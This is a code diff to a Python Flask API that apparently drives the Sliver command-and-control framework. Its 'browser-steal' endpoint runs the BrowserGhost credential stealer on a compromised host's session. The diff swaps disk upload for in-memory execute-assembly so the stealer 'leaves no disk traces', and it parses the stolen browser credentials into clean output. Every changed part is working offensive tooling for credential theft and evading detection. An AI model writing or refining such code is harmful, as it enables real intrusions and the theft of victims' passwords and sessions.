@@ -98,8 +98,8 @@ def run_sliver_command(commands: str, timeout: int = 180) -> str:
                 continue
             cleaned_lines.append(line)
         output = '\n'.join(cleaned_lines)
-        if len(output) > 2000:
-            output = output[-2000:]
+        if len(output) > 10000:
+            output = output[-10000:]
         return output
 
 
@@ -538,30 +538,37 @@ def dump_credentials():
 
 @app.route("/api/v1/browser-steal", methods=["POST"])
 def browser_steal():
-    """上传并执行 BrowserGhost，提取浏览器凭证"""
+    """通过 execute-assembly 在内存中执行 BrowserGhost，提取浏览器凭证"""
     data = request.get_json() or {}
     session_id = data.get("session_id", "")
 
     if not session_id:
         return jsonify({"error": "缺少 session_id"}), 400
 
-    # Step 1: 上传 BrowserGhost
     local_path = "D:/sliver/BrowserGhost/bin/Release/BrowserGhost.exe"
-    remote_path = "C:/Users/26234/BrowserGhost.exe"
     if not os.path.isfile(local_path):
         return jsonify({"error": f"BrowserGhost.exe 不存在: {local_path}"}), 500
 
-    upload_cmd = f"use {session_id}\nupload \"{local_path}\" \"{remote_path}\""
-    upload_output = run_sliver_command(upload_cmd, timeout=300)
+    # 使用 execute-assembly 在内存中加载 .NET 程序集，不留磁盘痕迹
+    sliver_cmd = f"use {session_id}\nexecute-assembly \"{local_path}\""
+    raw_output = run_sliver_command(sliver_cmd, timeout=300)
 
-    # Step 2: 执行 BrowserGhost
-    exec_cmd = f"use {session_id}\nexecute -o {remote_path}"
-    exec_output = run_sliver_command(exec_cmd, timeout=300)
+    # 用 BrowserGhost 的输出特征判断成功
+    # "[+] Current user" 在开头，"Recvtoself" 在结尾，双保险防止截断导致误判
+    success = "[+] Current user" in raw_output or "Recvtoself" in raw_output
+
+    clean_output = raw_output
+    if "[*] Output:" in raw_output:
+        # 兼容 \n 和 \r\n
+        clean_output = raw_output.split("[*] Output:", 1)[-1]
+        clean_output = clean_output.lstrip("\r\n ")
+        clean_output = clean_output.split("[*] Recvtoself", 1)[0].strip()
 
     return jsonify({
-        "success": "Output:" in exec_output,
-        "upload_ok": "successfully" in upload_output.lower(),
-        "output": exec_output[-1000:] if len(exec_output) > 1000 else exec_output,
+        "success": success,
+        "output": clean_output,
+        "lines": [l for l in clean_output.split("\n") if l.strip()],
+        "error": "" if success else clean_output[-500:],
     })
 
 
